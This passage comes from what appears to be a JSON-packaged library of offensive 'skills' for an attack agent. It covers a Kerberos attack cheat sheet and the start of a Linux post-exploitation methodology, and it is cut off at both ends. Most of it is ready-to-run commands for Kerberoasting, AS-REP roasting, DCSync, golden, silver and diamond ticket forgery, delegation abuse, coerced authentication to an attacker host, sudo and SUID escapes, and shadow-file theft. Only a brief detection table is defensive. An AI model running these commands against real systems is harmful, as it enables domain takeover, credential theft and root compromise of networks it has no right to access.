class=\"code\"><code>Client                    KDC (DC)                   Service\n   │                         │                          │\n   │──AS-REQ (username)─────&gt;│                          │\n   │&lt;─AS-REP (TGT)───────────│                          │\n   │                         │                          │\n   │──TGS-REQ (TGT, SPN)────&gt;│                          │\n   │&lt;─TGS-REP (TGS)──────────│                          │\n   │                         │                          │\n   │──AP-REQ (TGS)──────────────────────────────────────&gt;│\n   │&lt;─AP-REP────────────────────────────────────────────│</code></pre>","n":591},{"t":"Attack Categories","h":"<h4 class=\"mh\">1. Kerberoasting</h4><p>Request TGS tickets for service accounts and crack offline.</p><pre class=\"code\" data-lang=bash><code># Impacket - GetUserSPNs\nGetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request\n\n# Rubeus (Windows)\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# NetExec\nnxc ldap 10.0.0.1 -u user -p pass --kerberoasting kerberoast.txt\n\n# Targeting specific user\nGetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request-user svc_sql</code></pre><p><strong>Crack Hashes:</strong></p><pre class=\"code\" data-lang=bash><code># Hashcat\nhashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule\n\n# John\njohn --format=krb5tgs hashes.txt --wordlist=wordlist.txt</code></pre><h4 class=\"mh\">2. AS-REP Roasting</h4><p>Attack accounts with &quot;Do not require Kerberos preauthentication&quot; enabled.</p><pre class=\"code\" data-lang=bash><code># Find vulnerable users\nGetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat\n\n# With credentials (query LDAP)\nGetNPUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -request\n\n# Rubeus (Windows)\nRubeus.exe asreproast /outfile:asrep.txt\n\n# NetExec\nnxc ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt</code></pre><p><strong>Crack Hashes:</strong></p><pre class=\"code\" data-lang=bash><code># Hashcat\nhashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule</code></pre><h4 class=\"mh\">3. Pass-the-Ticket (PtT)</h4><p>Inject stolen Kerberos tickets into session.</p><pre class=\"code\" data-lang=bash><code># Export tickets (Mimikatz)\nsekurlsa::tickets /export\n\n# Inject ticket (Mimikatz)\nkerberos::ptt ticket.kirbi\n\n# Rubeus inject\nRubeus.exe ptt /ticket:base64_ticket\n\n# Linux - export ticket\nexport KRB5CCNAME=/path/to/ticket.ccache\n\n# Convert kirbi to ccache\nticketConverter.py ticket.kirbi ticket.ccache</code></pre><h4 class=\"mh\">4. Overpass-the-Hash (Pass-the-Key)</h4><p>Request TGT using NTLM hash instead of password.</p><pre class=\"code\" data-lang=bash><code># Rubeus\nRubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt\n\n# Impacket\ngetTGT.py domain.local/admin -hashes :NTLM_HASH\n\n# With AES key\ngetTGT.py domain.local/admin -aesKey AES_KEY</code></pre><h4 class=\"mh\">5. Golden Ticket</h4><p>Forge TGT using KRBTGT hash (requires domain compromise).</p><pre class=\"code\" data-lang=bash><code># Get KRBTGT hash (DCSync)\nsecretsdump.py domain.local/admin@10.0.0.1 -just-dc-user krbtgt\n\n# Create Golden Ticket (Mimikatz)\nkerberos::golden /user:fakeadmin /domain:domain.local \\\n  /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_HASH /ptt\n\n# Impacket\nticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID \\\n  -domain domain.local fakeadmin\n\n# Use ticket\nexport KRB5CCNAME=fakeadmin.ccache\npsexec.py domain.local/fakeadmin@dc01 -k -no-pass</code></pre><h4 class=\"mh\">6. Silver Ticket</h4><p>Forge TGS for specific service using service account hash.</p><pre class=\"code\" data-lang=bash><code># Get service account hash\nsecretsdump.py domain.local/admin@10.0.0.1 -just-dc-user svc_sql$\n\n# Create Silver Ticket for CIFS (Mimikatz)\nkerberos::golden /user:fakeadmin /domain:domain.local \\\n  /sid:S-1-5-21-DOMAIN-SID /target:server.domain.local \\\n  /service:cifs /rc4:SERVICE_NTLM /ptt\n\n# Impacket - Silver ticket for MSSQL\nticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-DOMAIN-SID \\\n  -domain domain.local -spn MSSQLSvc/sql01.domain.local:1433 admin</code></pre><p><strong>Common Service SPNs:</strong></p><div class=\"tw\"><table><thead><tr><th>Service</th><th>SPN</th></tr></thead><tbody><tr><td>SMB/CIFS</td><td>cifs/hostname</td></tr><tr><td>MSSQL</td><td>MSSQLSvc/hostname:1433</td></tr><tr><td>HTTP</td><td>http/hostname</td></tr><tr><td>LDAP</td><td>ldap/hostname</td></tr><tr><td>HOST</td><td>host/hostname</td></tr></tbody></table></div><h4 class=\"mh\">7. Diamond Ticket</h4><p>Modify legitimate TGT (harder to detect than Golden Ticket).</p><pre class=\"code\" data-lang=bash><code># Rubeus (requires KRBTGT AES key)\nRubeus.exe diamond /krbkey:AES256_KEY /user:user /password:pass \\\n  /enctype:aes /ticketuser:fakeadmin /ticketuserid:500 /groups:512 /ptt</code></pre><h4 class=\"mh\">8. Delegation Attacks</h4><h5 class=\"mh\">Unconstrained Delegation</h5><pre class=\"code\" data-lang=bash><code># Find unconstrained delegation computers\nGet-ADComputer -Filter {TrustedForDelegation -eq $true}\n\n# Coerce authentication (PrinterBug)\nSpoolSample.exe dc01.domain.local attacker.domain.local\n\n# Capture and use TGT\nRubeus.exe monitor /interval:1\nRubeus.exe ptt /ticket:base64_tgt</code></pre><h5 class=\"mh\">Constrained Delegation</h5><pre class=\"code\" data-lang=bash><code># S4U2Self + S4U2Proxy\ngetST.py -spn cifs/target.domain.local domain.local/svc_constrained:pass \\\n  -impersonate administrator\n\n# Rubeus\nRubeus.exe s4u /user:svc_constrained /rc4:HASH \\\n  /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt</code></pre><h5 class=\"mh\">Resource-Based Constrained Delegation (RBCD)</h5><pre class=\"code\" data-lang=bash><code># Add computer account\naddcomputer.py domain.local/user:pass -method LDAPS -computer-name FAKE$ -computer-pass Pass123\n\n# Set msDS-AllowedToActOnBehalfOfOtherIdentity\nrbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip 10.0.0.1 domain.local/user:pass\n\n# Get ticket\ngetST.py -spn cifs/target.domain.local domain.local/FAKE$:Pass123 -impersonate administrator\n\n# Use ticket\nexport KRB5CCNAME=administrator.ccache\nsmbexec.py domain.local/administrator@target.domain.local -k -no-pass</code></pre><h4 class=\"mh\">9. Kerberos Relay</h4><p>Relay Kerberos authentication (KrbRelayUp, KrbRelay).</p><pre class=\"code\" data-lang=bash><code># KrbRelayUp (local privilege escalation)\nKrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \\\n  -ComputerName YOURCOMPUTER$ -ComputerPassword Password123\n\n# Then use RBCD to escalate</code></pre>","n":4870},{"t":"Encryption Types","h":"<div class=\"tw\"><table><thead><tr><th>etype</th><th>Algorithm</th><th>Strength</th></tr></thead><tbody><tr><td>0x17 (23)</td><td>RC4-HMAC</td><td>Weak (NTLM hash)</td></tr><tr><td>0x11 (17)</td><td>AES128-CTS</td><td>Strong</td></tr><tr><td>0x12 (18)</td><td>AES256-CTS</td><td>Strongest</td></tr></tbody></table></div>","n":229},{"t":"Ticket Fields","h":"<div class=\"tw\"><table><thead><tr><th>Field</th><th>Description</th></tr></thead><tbody><tr><td>cname</td><td>Client principal name</td></tr><tr><td>crealm</td><td>Client realm</td></tr><tr><td>sname</td><td>Service principal name</td></tr><tr><td>srealm</td><td>Service realm</td></tr><tr><td>enc-part</td><td>Encrypted ticket data</td></tr><tr><td>authtime</td><td>Authentication time</td></tr><tr><td>starttime</td><td>Ticket valid from</td></tr><tr><td>endtime</td><td>Ticket expires</td></tr><tr><td>renew-till</td><td>Renewal expiration</td></tr></tbody></table></div>","n":439},{"t":"Detection Indicators","h":"<div class=\"tw\"><table><thead><tr><th>Attack</th><th>Event ID</th><th>Indicator</th></tr></thead><tbody><tr><td>Kerberoasting</td><td>4769</td><td>RC4 ticket requests</td></tr><tr><td>AS-REP Roast</td><td>4768</td><td>Pre-auth disabled accounts</td></tr><tr><td>Golden Ticket</td><td>4769</td><td>Non-existent users</td></tr><tr><td>Silver Ticket</td><td>N/A</td><td>Direct service access</td></tr><tr><td>Overpass-the-Hash</td><td>4768</td><td>NTLM in AS-REQ</td></tr><tr><td>DCSync</td><td>4662</td><td>DS-Replication-Get-Changes</td></tr></tbody></table></div>","n":495}],"m":{"name":16,"desc":384,"body":6782,"file":7356,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.5},"name":{"lim":64,"pct":25.0}}}},"linux-postexploit":{"slug":"linux-postexploit","pillar":"operators","name":"linux-postexploit","description":"Escalate and hold a Linux host from ordinary userland — SUID and SGID binaries, sudo rules and file capabilities worked through GTFOBins, shadow and SSH key theft, cron and systemd-timer persistence, and container-escape triage from an exposed docker socket or over-privileged namespace. Reach for it with a shell in hand and no kernel BPF program available; the CAP_BPF path belongs to ebpf-attacks.","family":"host-postexploit","ported":false,"source":null,"summary":"Linux post-exploitation from an ordinary shell: enumerate what the current user can already reach, escalate through misconfiguration rather than kernel implants, harvest credentials, establish persistence, and check for a container escape — all with standard userland tooling.","file":"acordia-operators/skills/linux-postexploit/SKILL.md","used_by":["internal-network"],"intro":"<p># Linux Post-Exploitation Methodology</p><p>Linux post-exploitation from an ordinary shell: enumerate what the current user can already reach, escalate through misconfiguration rather than kernel implants, harvest credentials, establish persistence, and check for a container escape — all with standard userland tooling.</p>","secs":[{"t":"Prerequisites","h":"<ol class=\"ml\"><li><strong>A shell</strong> as any user; escalation targets are found from there.</li><li><strong>Standard binaries</strong> — <code>find</code>, <code>getcap</code>, <code>sudo</code>, <code>crontab</code>, <code>ss</code>; <code>linpeas.sh</code> if you can stage it.</li><li><strong>Know where you are</strong> — physical host, VM, or container — because it changes both the targets and the escape (see Container escape).</li></ol><pre class=\"code\" data-lang=bash><code>id; hostname; uname -a                    # who am I, which kernel\ncat /etc/os-release                       # distro and version\n[ -f /.dockerenv ] &amp;&amp; echo &quot;in a container&quot;   # container tell</code></pre>","n":515},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Local enumeration</h4><div class=\"tw\"><table><thead><tr><th>Target</th><th>Command</th><th>Why</th></tr></thead><tbody><tr><td>SUID/SGID binaries</td><td><code>find / -perm -4000 -o -perm -2000 2&gt;/dev/null</code></td><td>A SUID binary with a GTFOBins entry is a direct root path</td></tr><tr><td>File capabilities</td><td><code>getcap -r / 2&gt;/dev/null</code></td><td><code>cap_setuid+ep</code> on an interpreter is root; <code>cap_dac_read_search</code> reads any file</td></tr><tr><td>sudo rights</td><td><code>sudo -l</code></td><td>A <code>NOPASSWD</code> entry, or any binary with a GTFOBins <code>sudo</code> entry, escalates</td></tr><tr><td>Writable sensitive files</td><td>`find / -writable -type f 2&gt;/dev/null</td><td>grep -E '/etc/(passwd</td><td>shadow</td><td>sudoers)'`</td><td>A writable <code>/etc/passwd</code> or <code>/etc/shadow</code> is instant root</td></tr><tr><td>Cron and timers</td><td><code>cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers --all</code></td><td>A world-writable script run by root cron/timer is a scheduled root shell</td></tr><tr><td>Readable shadow</td><td><code>ls -l /etc/shadow; getent shadow 2&gt;/dev/null</code></td><td>Readable hashes go to offline <code>hashcat -m 1800</code></td></tr></tbody></table></div><p>Run <code>linpeas.sh</code> for breadth when you can stage it, but treat the table above as the manual baseline that always works.</p><h4 class=\"mh\">Phase 2 — Privilege escalation</h4><div class=\"tw\"><table><thead><tr><th>Vector</th><th>Method</th></tr></thead><tbody><tr><td>Sudo misconfiguration</td><td><code>sudo -l</code> → for each allowed binary check its <a href=\"https://gtfobins.github.io\" target=\"_blank\" rel=\"noopener\">GTFOBins</a> <code>sudo</code> entry (e.g. <code>sudo vim -c ':!/bin/sh'</code>, <code>sudo find . -exec /bin/sh \\; -quit</code>)</td></tr><tr><td><code>env_keep</code>/<code>LD_PRELOAD</code></td><td>if <code>sudo -l</code> shows <code>env_keep+=LD_PRELOAD</code>, compile a <code>.so</code> with a <code>_init</code> that runs <code>setuid(0)</code> and load it via a sudo-allowed binary</td></tr><tr><td>SUID GTFOBins</td><td>for each SUID binary, use its GTFOBins <code>suid</code> entry to spawn a shell keeping euid 0</td></tr><tr><td>Capabilities</td><td><code>cap_setuid</code> interpreter: <code>python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'</code>; <code>cap_dac_read_search</code>: re
